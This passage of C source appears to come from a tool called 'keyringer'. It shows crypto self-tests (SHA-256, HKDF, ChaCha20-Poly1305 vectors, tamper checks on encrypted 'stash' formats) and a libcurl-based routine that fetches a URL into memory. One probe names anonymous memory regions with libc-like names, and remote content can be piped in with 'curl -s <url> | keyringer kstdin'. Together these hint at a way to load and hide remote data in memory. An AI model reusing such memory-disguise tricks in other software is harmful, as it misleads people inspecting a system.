        if (envelope_open(key, env, envlen, &back, &backlen, err) != 0) {
            free(env);
            return -1;
        }
        if (backlen != sizeof blob || memcmp(back, blob, sizeof blob) != 0) {
            free(env);
            free(back);
            return seterr(err, "selftest: envelope roundtrip mismatch");
        }
        free(env);
        free(back);
    }

    /* 5: SHA-256 via AF_ALG — known answer for the RFC 8439 2.8.2 plaintext */
    {
        static const uint8_t kat[32] = {
            0x34, 0xdb, 0xfc, 0xbb, 0xe7, 0x3c, 0x59, 0x19,
            0x5a, 0x7a, 0xc5, 0x63, 0xb4, 0x1b, 0x82, 0xf3,
            0x34, 0x84, 0x50, 0x53, 0xc7, 0x07, 0xb8, 0x3d,
            0x81, 0x79, 0xd7, 0xb1, 0x65, 0x77, 0x8b, 0x19
        };
        uint8_t dig[32];

        if (sha256_afalg(st_pt, sizeof st_pt, dig, err) != 0)
            return -1;
        if (memcmp(dig, kat, 32) != 0)
            return seterr(err, "selftest: sha256(AF_ALG) known-answer "
                          "mismatch for the RFC 8439 2.8.2 plaintext");
    }

    /* 6: full wire-v2 stash format roundtrip (KRH1 header || envelope) */
    {
        uint8_t key[32]; char hexkey[KR_KEY_HEX_LEN + 1];
        uint8_t blob[512], *wire = NULL, *back = NULL;
        size_t wirelen = 0, backlen = 0;

        for (size_t i = 0; i < sizeof blob; i++)
            blob[i] = (uint8_t)(i * 13 + 5);
        if (kr_random(key, sizeof key) != 0)
            return seterr(err, "selftest: cannot obtain key randomness");
        hex32_encode(key, hexkey);

        kr_opts o2;
        memset(&o2, 0, sizeof o2);
        o2.key_hex = hexkey;

        if (build_v2_wire(key, blob, sizeof blob, &wire, &wirelen, err) != 0)
            return -1;
        if (wirelen != KR_HDR_LEN + sizeof blob + KR_ENV_OVERHEAD) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "selftest: unexpected v2 wire size %zu",
                          wirelen);
        }
        if (memcmp(wire, KR_WIRE_MAGIC, 4) != 0 ||
            wire[4] != KR_HDR_FLAG_ENC) {
            volatile_wipe(wire, wirelen);
            free(wire);
            return seterr(err, "selftest: bad v2 header (magic/flags)");
        }
        if (wire_open(&o2, wire, wirelen, &back, &backlen, err) != 0)
            return -1;
        if (backlen != sizeof blob || memcmp(back, blob, sizeof blob) != 0) {
            volatile_wipe(back, backlen);
            free(back);
            return seterr(err, "selftest: v2 stash roundtrip mismatch");
        }
        volatile_wipe(back, backlen);
        free(back);

        /* 6b: plaintext (flags=0) v2 stash roundtrip */
        if (build_v2_wire(NULL, blob, sizeof blob, &wire, &wirelen, err) != 0)
            return -1;
        if (wire_open(NULL, wire, wirelen, &back, &backlen, err) != 0)
            return -1;
        if (backlen != sizeof blob || memcmp(back, blob, sizeof blob) != 0) {
            volatile_wipe(back, backlen);
            free(back);
            return seterr(err, "selftest: v2 plaintext stash roundtrip "
                          "mismatch");
        }
        volatile_wipe(back, backlen);
        free(back);
    }

    /* 7: a deliberate bit-flip must FAIL digest verification */
    {
        uint8_t key[32]; char hexkey[KR_KEY_HEX_LEN + 1];
        uint8_t blob[512], *wire = NULL, *back = NULL;
        size_t wirelen = 0, backlen = 0;

        for (size_t i = 0; i < sizeof blob; i++)
            blob[i] = (uint8_t)(i * 29 + 11);
        if (kr_random(key, sizeof key) != 0)
            return seterr(err, "selftest: cannot obtain key randomness");
        hex32_encode(key, hexkey);

        kr_opts o2;
        memset(&o2, 0, sizeof o2);
        o2.key_hex = hexkey;

        /* 7a: flip one stored DIGEST byte (envelope stays intact) */
        if (build_v2_wire(key, blob, sizeof blob, &wire, &wirelen, err) != 0)
            return -1;
        wire[10] ^= 0x40;
        if (wire_open(&o2, wire, wirelen, &back, &backlen, err) == 0) {
            volatile_wipe(back, backlen);
            free(back);
            return seterr(err, "selftest: tampered v2 digest was NOT "
                          "rejected");
        }
        if (!strstr(err, "MISMATCH"))
            return seterr(err, "selftest: tampered v2 digest failed with the "
                          "wrong error: %s", err);

        /* 7b: flip one PLAINTEXT byte in a plaintext stash */
        if (build_v2_wire(NULL, blob, sizeof blob, &wire, &wirelen, err) != 0)
            return -1;
        wire[KR_HDR_LEN + 7] ^= 0x01;
        if (wire_open(NULL, wire, wirelen, &back, &backlen, err) == 0) {
            volatile_wipe(back, backlen);
            free(back);
            return seterr(err, "selftest: tampered v2 plaintext was NOT "
                          "rejected");
        }
        if (!strstr(err, "MISMATCH"))
            return seterr(err, "selftest: tampered v2 plaintext failed with "
                          "the wrong error: %s", err);
    }

    /*
     * 8: PR_SET_VMA naming probe (wire v2.2) — strictly informational.
     * A self-test page is named via prctl(PR_SET_VMA, ANON_NAME, ...)
     * and /proc/self/maps is grepped for the name. Failure is logged
     * (with errno) and cached for kr_vma_probe()/preflight but never
     * fails the selftest: the feature is cosmetic and nonfatal on
     * kernels without CONFIG_ANON_VMA_NAME.
     */
    kr_logf("selftest: PR_SET_VMA naming probe: %s",
            kr_vma_probe() ? "supported ([anon:libc:*] names reach "
                            "/proc/self/maps)"
                           : "not supported (VMA names will be skipped)");

    /* 9: userspace crypto KATs — the portability fallback path is pinned
     * to the published vectors exactly like the AF_ALG path above */
    {
        uint8_t d[32], okm[42];
        uint8_t ikm[22], salt[13], info[10];
        int i;

        sha256_ref((const uint8_t *)"abc", 3, d);
        if (!hex_eq_str("ba7816bf8f01cfea414140de5dae2223"
                        "b00361a396177a9cb410ff61f20015ad", d, 32))
            return seterr(err, "selftest: userspace SHA-256 KAT mismatch");
        {
            uint8_t hk[20];

            memset(hk, 0x0b, 20);
            hmac_sha256_ref(hk, 20, (const uint8_t *)"Hi There", 8, d);
        }
        if (!hex_eq_str("b0344c61d8db38535ca8afceaf0bf12b"
                        "881dc200c9833da726e9376c2e32cff7", d, 32))
            return seterr(err, "selftest: userspace HMAC-SHA256 KAT mismatch");
        for (i = 0; i < 22; i++) ikm[i] = 0x0b;
        for (i = 0; i < 13; i++) salt[i] = (uint8_t)i;
        for (i = 0; i < 10; i++) info[i] = (uint8_t)(0xf0 + i);
        hkdf_sha256_ref(ikm, 22, salt, 13, info, 10, okm, 42);
        if (!hex_eq_str("3cb25f25faacd57a90434f64d0362f2a"
                        "2d2d0a90cf1a5a4c5db02d56ecc4c5bf"
                        "34007208d5b887185865", okm, 42))
            return seterr(err, "selftest: HKDF-SHA256 RFC 5869 KAT mismatch");
        {
            /* RFC 8439 2.8.2 through aead_ref_op, then cross-interop with
             * the kernel path in both directions */
            /*
             * n2 = the RFC nonce 00 00 00 07 40 41 ... 47 — bytes 1..3
             * MUST read as zero. They were previously left uninitialized
             * (only n2[0] and n2[4..] were set), which passed only while
             * the stack slots happened to be zero (fresh musl stack) and
             * failed the vector on stacks dirtied by earlier sections
             * (found via make libtest's glibc lane + valgrind).
             */
            uint8_t k2[32], n2[12] = { 0 }, aad2[12];
            uint8_t env[12 + 114 + 16], outk[12 + 114 + 16];
            uint8_t back[12 + 114];

            for (i = 0; i < 32; i++) k2[i] = (uint8_t)(0x80 + i);
            n2[0] = 7;
            n2[4] = 0x40; n2[5] = 0x41; n2[6] = 0x42; n2[7] = 0x43;
            n2[8] = 0x44; n2[9] = 0x45; n2[10] = 0x46; n2[11] = 0x47;
            memcpy(aad2, "\x50\x51\x52\x53\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7", 12);
            if (aead_ref_op(0, k2, aad2, sizeof aad2, st_pt, sizeof st_pt,
                            n2, env, err) != 0)
                return -1;
            if (!hex_eq_str("d31a8d34648e60db7b86afbc53ef7ec2"
                            "a4aded51296e08fea9e2b5a736ee62d6"
                            "3dbea45e8ca9671282fafb69da92728"
                            "b1a71de0a9e060b2905d6a5b67ecd3b"
                            "3692ddbd7f2d778b8c9803aee328091"
                            "b58fab324e4fad675945585808b4831"
                            "d7bc3ff4def08e4b7a9de576d26586c"
                            "ec64b6116", env + 12, 114) ||
                !hex_eq_str("1ae10b594f09e26a7e902ecbd0600691",
                            env + 12 + 114, 16))
                return seterr(err, "selftest: userspace ChaCha20-Poly1305 "
                              "RFC 8439 2.8.2 vector mismatch");
            if (aead_op(0, k2, aad2, sizeof aad2, st_pt, sizeof st_pt,
                        n2, outk, err) != 0)
                return -1;
            if (memcmp(outk, env, sizeof env) != 0)
                return seterr(err, "selftest: AF_ALG and userspace AEAD "
                              "outputs diverge");
            if (aead_ref_op(1, k2, aad2, sizeof aad2, outk + 12,
                            114 + 16, n2, back, err) != 0 ||
                memcmp(back + 12, st_pt, sizeof st_pt) != 0)
                return seterr(err, "selftest: userspace cannot open the "
                              "kernel-sealed envelope");
        }
    }

    /*
     * 10: wire v4 (experimental) — per-chunk AEAD roundtrip through the
     * buffer reader: multi-chunk encrypted body, plaintext body, header
     * layout + exact length equation, wrong-key refusal and header-tamper
     * refusal (the AAD binds the whole 56-byte header per chunk).
     */
    {
        size_t blen = 2 * KR_V4_PT_CHUNK + 1234;      /* 3 pt-chunks */
        uint8_t *blob = malloc(blen);
        uint8_t key[32];
        char hexkey[KR_KEY_HEX_LEN + 1];
        uint8_t *wire = NULL, *back = NULL;
        size_t wirelen = 0, backlen = 0;
        uint32_t total = (uint32_t)((blen + KR_V4_PT_CHUNK - 1) /
                                    KR_V4_PT_CHUNK);
        int bad = 0;

        if (!blob)
            return seterr(err, "out of memory");
        for (size_t i = 0; i < blen; i++)
            blob[i] = (uint8_t)(i * 31 + 7);
        if (kr_random(key, sizeof key) != 0) {
            free(blob);
            return seterr(err, "selftest: cannot obtain key randomness");
        }
        hex32_encode(key, hexkey);

        kr_opts o4;

        memset(&o4, 0, sizeof o4);
        o4.key_hex = hexkey;

        /* 10a: encrypted multi-chunk roundtrip + header layout */
        if (build_v4_wire(key, blob, blen, &wire, &wirelen, err) != 0) {
            free(blob);
            return -1;
        }
        if (memcmp(wire, KR_WIRE4_MAGIC, 4) != 0 ||
            wire[4] != (uint8_t)KR_WIRE4_VERSION ||
            wire[5] != (uint8_t)KR_HDR4_FLAG_ENC ||
            wirelen != KR_HDR4_LEN + (size_t)total * KR_V4_PIECE_OH + blen) {
            seterr(err, "selftest: bad v4 header (magic/version/flags or "
                   "length equation)");
            bad = 1;
        }
        if (!bad && wire_open(&o4, wire, wirelen, &back, &backlen, err) != 0)
            return -1;                    /* wire consumed by wire_open */
        if (!bad && (backlen != blen || memcmp(back, blob, blen) != 0)) {
            seterr(err, "selftest: v4 per-chunk roundtrip mismatch");
            bad = 1;
        }
        if (back) {
            volatile_wipe(back, backlen);
            free(back);
            back = NULL;
        }

        /* 10b: wrong key must fail closed (chunk 0 AEAD tag) */
        {
            uint8_t *w2 = NULL;
            size_t w2len = 0;

            if (!bad && build_v4_wire(key, blob, blen, &w2, &w2len, err) != 0) {
                free(blob);
                return -1;
            }
            if (!bad) {
                char badhex[KR_KEY_HEX_LEN + 1];
                uint8_t badkey[32];
                kr_opts obad;

                for (int i = 0; i < 32; i++)
                    badkey[i] = key[i] ^ 0x5a;
                hex32_encode(badkey, badhex);
                memset(&obad, 0, sizeof obad);
                obad.key_hex = badhex;
                if (wire_open(&obad, w2, w2len, &back, &backlen, err) == 0) {
                    seterr(err, "selftest: v4 wrong key was NOT rejected");
                    bad = 1;
                }
                volatile_wipe(badkey, sizeof badkey);
            }
        }

        /* 10c: flipping one header digest byte must fail the chunk AAD */
        if (!bad) {
            if (build_v4_wire(key, blob, blen, &wire, &wirelen, err) != 0) {
                free(blob);
                return -1;
            }
            wire[10] ^= 0x40;
            if (wire_open(&o4, wire, wirelen, &back, &backlen, err) == 0) {
                seterr(err, "selftest: tampered v4 header was NOT rejected");
                bad = 1;
            }
            if (back) {
                volatile_wipe(back, backlen);
                free(back);
                back = NULL;
            }
        }

        /* 10d: plaintext v4 body roundtrip */
        if (!bad) {
            if (build_v4_wire(NULL, blob, blen, &wire, &wirelen, err) != 0) {
                free(blob);
                return -1;
            }
            if (wirelen != KR_HDR4_LEN + blen || wire[5] != 0 ||
                wire_open(NULL, wire, wirelen, &back, &backlen, err) != 0 ||
                backlen != blen || memcmp(back, blob, blen) != 0) {
                seterr(err, "selftest: v4 plaintext roundtrip mismatch");
                bad = 1;
            }
            if (back) {
                volatile_wipe(back, backlen);
                free(back);
            }
        }
        volatile_wipe(key, sizeof key);
        volatile_wipe(blob, blen);
        free(blob);
        if (bad)
            return -1;
        kr_logf("selftest: wire v4 per-chunk AEAD roundtrip ok "
                "(%zu B in %u chunk(s), encrypted + plaintext, wrong-key "
                "+ header-tamper refused)", blen, total);
    }
    return 0;
}

/* ===================================================================== */
/* khttp: fetch a URL into memory via runtime-dlopened libcurl            */
/* ===================================================================== */

struct httpbuf {
    char  *data;
    size_t len, cap;
};

/* CURLOPT_WRITEFUNCTION callback */
#ifndef KR_NO_DLOPEN
static size_t http_write_cb(char *ptr, size_t size, size_t nmemb, void *ud)
{
    struct httpbuf *b = ud;
    size_t total = size * nmemb;

    if (total == 0)
        return 0;
    if (b->len + total > b->cap) {
        size_t ncap = b->cap ? b->cap : 65536;

        while (b->len + total > ncap)
            ncap *= 2;
        char *nd = realloc(b->data, ncap);

        if (!nd)
            return 0;              /* curl aborts the transfer on 0 */
        b->data = nd;
        b->cap = ncap;
    }
    memcpy(b->data + b->len, ptr, total);
    b->len += total;
    return total;
}
#endif /* KR_NO_DLOPEN */

/* minimal curl_slist definition (libcurl types are used via dlsym only;
 * layout matches curl.h so the dlopen'd curl_slist_append can fill it) */
struct curl_slist {
    char *data;
    struct curl_slist *next;
};

/*
 * libdl entry points as weak references: dynamic builds bind them to the
 * real libdl/libc definitions. Static links either keep musl's
 * always-failing stub (harmless) or — on static glibc lanes — are built
 * with -DKR_NO_DLOPEN so the code below is compiled out entirely: a
 * static glibc link would otherwise pull the archive member carrying
 * the "Using 'dlopen' in statically linked applications" linker warning.
 * Callers report the documented clean error in every no-dlopen case.
 */
#ifndef KR_NO_DLOPEN
extern void *dlopen(const char *, int) __attribute__((weak));
extern void *dlsym(void *restrict, const char *restrict) __attribute__((weak));
extern int dlclose(void *) __attribute__((weak));
extern char *dlerror(void) __attribute__((weak));
#endif
#ifndef RTLD_NOW
#define RTLD_NOW 2
#endif

/* libcurl option numbers (curl.h) for the wire v2.2 khttp extras */
#define KR_CURL_OPT_PROXY       10004   /* CURLOPT_PROXY       */
#define KR_CURL_OPT_HTTPHEADER  10023   /* CURLOPT_HTTPHEADER  */
#define KR_CURL_OPT_VERIFYPEER  64      /* CURLOPT_SSL_VERIFYPEER */
#define KR_CURL_OPT_VERIFYHOST  81      /* CURLOPT_SSL_VERIFYHOST */

int kr_http_get_ex(const char *url, const char *proxy,
                   const char *const *extra_headers, int insecure,
                   void **out, size_t *outlen, char err[KR_ERRSZ])
{
#ifdef KR_NO_DLOPEN
    (void)proxy; (void)extra_headers; (void)insecure;
    (void)out; (void)outlen;
    if (!url || !*url)
        return seterr(err, "khttp: empty url");
    return seterr(err, "khttp: dynamic loading not supported (static glibc "
                  "build) — use: curl -s <url> | keyringer kstdin");
#else
    if (!url || !*url)
        return seterr(err, "khttp: empty url");
    if (!dlopen)
        return seterr(err, "khttp: dynamic loading not supported (static "
                      "build) — use: curl -s <url> | keyringer kstdin");

    void *h = dlopen("libcurl.so.4", RTLD_NOW);

    if (!h) {
        const char *e = dlerror();

        return seterr(err, "khttp: cannot dlopen libcurl.so.4 (%s) — use: "
                      "curl -s <url> | keyringer kstdin",
                      e ? e : "dynamic loading not supported");
    }

    void *(*c_init)(void) = (void *(*)(void))dlsym(h, "curl_easy_init");
    int (*c_setopt)(void *, int, ...) = (int (*)(void *, int, ...))dlsym(h, "curl_easy_setopt");
    int (*c_perform)(void *) = (int (*)(void *))dlsym(h, "curl_easy_perform");
    void (*c_cleanup)(void *) = (void (*)(void *))dlsym(h, "curl_easy_cleanup");
    /* curl_slist: only needed for --header repeatable support */
    struct curl_slist *(*c_slist_append)(struct curl_slist *, const char *) =
        (struct curl_slist *(*)(struct curl_slist *, const char *))
        dlsym(h, "curl_slist_append");
    void (*c_slist_free)(struct curl_slist *) =
        (void (*)(struct curl_slist *))dlsym(h, "curl_slist_free_all");

    if (!c_init || !c_setopt || !c_perform || !c_cleanup) {
        dlclose(h);
        return seterr(err, "khttp: libcurl.so.4 is missing curl_easy_* "
                      "symbols — use: curl -s <url> | keyringer kstdin");
    }
    if (extra_headers && *extra_headers && (!c_slist_append || !c_slist_free)) {
        dlclose(h);
        return seterr(err, "khttp: libcurl.so.4 is missing curl_slist_* "
                      "(needed for --header)");
    }

    void *c = c_init();

    if (!c) {
        dlclose(h);
        return seterr(err, "khttp: curl_easy_init failed");
    }

    struct httpbuf b = { 0, 0, 0 };

    c_setopt(c, KR_CURL_OPT_URL, url);
    c_setopt(c, KR_CURL_OPT_WRITEFUNCTION, http_write_cb);
    c_setopt(c, KR_CURL_OPT_WRITEDATA, &b);
    c_setopt(c, KR_CURL_OPT_FOLLOWLOCATION, 1L);
    if (proxy && *proxy)
        c_setopt(c, KR_CURL_OPT_PROXY, proxy);
    if (extra_headers) {
        struct curl_slist *sl = NULL;

        for (size_t i = 0; extra_headers[i]; i++)
            sl = c_slist_append(sl, extra_headers[i]);
        if (sl)
            c_setopt(c, KR_CURL_OPT_HTTPHEADER, sl);
    }
    if (insecure) {
        /* --insecure: disable TLS peer + host verification (explicit opt-in) */
        c_setopt(c, KR_CURL_OPT_VERIFYPEER, 0L);
        c_setopt(c, KR_CURL_OPT_VERIFYHOST, 0L);
    }
    /* TLS peer verification stays at libcurl defaults otherwise: enabled */

    int rc = c_perform(c);

    c_cleanup(c);
    dlclose(h);
    if (rc != 0) {
        free(b.data);
        return seterr(err, "khttp: curl transfer failed (curl error %d) — "
                      "use: curl -s <url> | keyringer kstdin", rc);
    }
    if (!b.data) {
        b.data = malloc(1);
        if (!b.data)
            return seterr(err, "out of memory");
    }
    *out = b.data;
    *outlen = b.len;
    return 0;
#endif /* KR_NO_DLOPEN */
}

int kr_http_get(const char *url, void **out, size_t *outlen, char err[KR_ERRSZ])
{
    return kr_http_get_ex(url, NULL, NULL, 0, out, outlen, err);
}
